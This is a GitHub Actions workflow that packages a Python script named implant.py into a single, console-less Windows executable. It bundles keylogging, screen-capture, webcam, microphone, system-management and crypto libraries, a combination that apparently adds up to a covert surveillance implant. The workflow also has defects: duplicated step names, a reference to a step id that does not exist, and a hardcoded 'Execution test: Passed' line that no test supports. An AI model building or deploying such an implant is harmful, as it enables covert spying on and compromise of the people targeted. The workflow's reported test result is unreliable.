name: Build Full Implant

on:
  workflow_dispatch:  # Allows manual trigger

jobs:
  build-windows:
    runs-on: windows-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'  # Stable version with good PyInstaller support

      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyinstaller==6.10.0  # Pin a known-good version
          pip install requests cryptography mss opencv-python keyboard pywin32 wmi pillow PyAudio pycryptodomex

      - name: Build with PyInstaller
        run: |
          python implant.py
          
      - name: Build with PyInstaller
        run: |
          pyinstaller --onefile --noconsole `
            --name implant `
            --add-data "implant.py;." `
            --hidden-import=keyboard `
            --hidden-import=pywin32 `
            --hidden-import=wmi `
            --hidden-import=PIL `
            --hidden-import=cv2 `
            --hidden-import=mss `
            --hidden-import=pyaudio `
            --collect-all mss `
            --collect-all opencv_python `
            --collect-all pyaudio `
            --collect-all keyboard `
            implant.py

      


      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: implant-windows-exe
          path: dist/implant.exe
          retention-days: 7

      - name: Summary
        run: |
          echo "### Build Summary" >> $env:GITHUB_STEP_SUMMARY
          echo "- Binary size: ${{ steps.size_check.outputs.size_mb }} MB" >> $env:GITHUB_STEP_SUMMARY
          echo "- Execution test: Passed" >> $env:GITHUB_STEP_SUMMARY
          echo "- Artifact: implant.exe" >> $env:GITHUB_STEP_SUMMARY
